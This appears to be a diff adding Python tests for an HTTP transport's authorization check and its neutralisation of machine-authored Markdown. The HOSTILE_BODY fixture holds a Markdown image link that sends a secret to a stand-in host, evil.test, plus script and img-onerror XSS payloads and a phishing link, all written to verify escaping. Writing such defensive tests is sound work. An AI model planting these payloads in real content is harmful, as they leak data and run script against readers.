@@ -153,6 +153,9 @@ def test_http_transport_authorization_helper() -> None:
     assert is_authorized("Bearer test-token", "test-token")
     assert not is_authorized(None, "test-token")
     assert not is_authorized("Bearer other", "test-token")
+    # A prefix match is not a match: comparing only `supplied[:len(expected)]`
+    # would admit any header that merely starts with the right token.
+    assert not is_authorized("Bearer test-tokenextra", "test-token")
 
 
 def test_http_transport_authorization_compares_in_constant_time(
@@ -550,6 +553,111 @@ def test_http_transport_operation_run_ignores_caller_supplied_actor(workspace: P
     assert response["result"]["status"] == "failed"
     assert response["result"]["error"] == "trace-integrity-scan requires integrity actor authority"
     request = state.request_row(workspace, "http-claims-integrity")
+    assert request is not None
+    assert request["actor"] == "pi"
+
+
+HOSTILE_BODY = (
+    "![exfil](https://evil.test/pixel?d=SECRET)\n"
+    "\n"
+    "<script>alert(1)</script>\n"
+    "\n"
+    "<img src=x onerror=alert(1)>\n"
+    "\n"
+    "[click me](https://evil.test/phish)\n"
+)
+
+
+def test_http_transport_neutralizes_machine_authored_bodies_despite_pi_authority(
+    workspace: Path,
+) -> None:
+    """The door holds PI *authority*; the bodies it posts are still machine *authorship*.
+
+    `trusted_writer` gates untrusted-Markdown neutralization on the operation
+    context, so a door that only raised `actor` would have written every posted
+    body verbatim. `machine_authored=True` keeps the CS1 defusal in force (#1596).
+    """
+    response, http_status = _dispatch(
+        workspace,
+        "POST",
+        "/operation/run",
+        lambda: {
+            "operation_id": "create-concept",
+            "payload": {
+                "target_path": "notes/hostile.md",
+                "content": (
+                    "---\ntype: note\ntitle: Hostile\ntags: []\nlinks: {}\n---\n" + HOSTILE_BODY
+                ),
+                "concept_type": "note",
+            },
+            "idempotency_key": "http-hostile",
+        },
+    )
+
+    assert http_status == HTTPStatus.OK
+    assert response["ok"] is True
+    written = (workspace / "notes/hostile.md").read_text(encoding="utf-8")
+    # The defused form landed...
+    assert "\\[exfil] (`https://evil.test/pixel?d=SECRET`)" in written
+    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in written
+    assert "&lt;img src=x onerror=alert(1)&gt;" in written
+    assert "click me (`https://evil.test/phish`)" in written
+    # ...and none of the live forms did.
+    assert "![exfil](" not in written
+    assert "<script>" not in written
+    assert "<img src=x" not in written
+    assert "[click me](" not in written
+    # Authorship is recorded on the envelope the worker binds its context from.
+    request = state.request_row(workspace, "http-hostile")
+    assert request is not None
+    assert request["actor"] == "pi"
+    job = state.request_job(workspace, "http-hostile")
+    assert job is not None
+    assert job["request_envelope"]["machine_authored"] is True
+    assert job["bound_context"]["machine_authored"] is True
+
+
+def test_http_transport_pi_authority_still_runs_pi_reserved_operations(
+    workspace: Path,
+) -> None:
+    """Neutralizing machine-authored bodies must not cost the door its PI authority.
+
+    `cascade-rollback` is PI-reserved in `PROTECTED_OPERATION_ACTORS`, and
+    `_require_operation_actor` is the first check inside `_run_operation_job` —
+    so reaching a `done` result proves the actor guard passed at the door.
+    """
+    worker.enqueue_trusted_write(
+        workspace,
+        "notes/rollback.md",
+        "---\ntype: note\ntitle: Rollback\ntags: []\nlinks: {}\n---\nBody.\n",
+        idempotency_key="write-rollback",
+        actor="operation",
+    )
+    worker.run_next_job(workspace, machine="test-machine")
+    assert (workspace / "notes/rollback.md").is_file()
+
+    response, http_status = _dispatch(
+        workspace,
+        "POST",
+        "/operation/run",
+        lambda: {
+            "operation_id": "cascade-rollback",
+            "payload": {
+                "target_id": "notes/rollback.md",
+                "reason": "pane rollback",
+                "include_target": True,
+            },
+            "idempotency_key": "http-rollback",
+        },
+    )
+
+    assert http_status == HTTPStatus.OK
+    assert response["result"].get("error") != "cascade-rollback requires PI actor authority"
+    assert response["ok"] is True
+    assert response["result"]["status"] == "done"
+    assert response["result"]["rollback"]["reverted"] == ["notes/rollback.md"]
+    assert not (workspace / "notes/rollback.md").exists()
+    request = state.request_row(workspace, "http-rollback")
     assert request is not None
     assert request["actor"] == "pi"
 
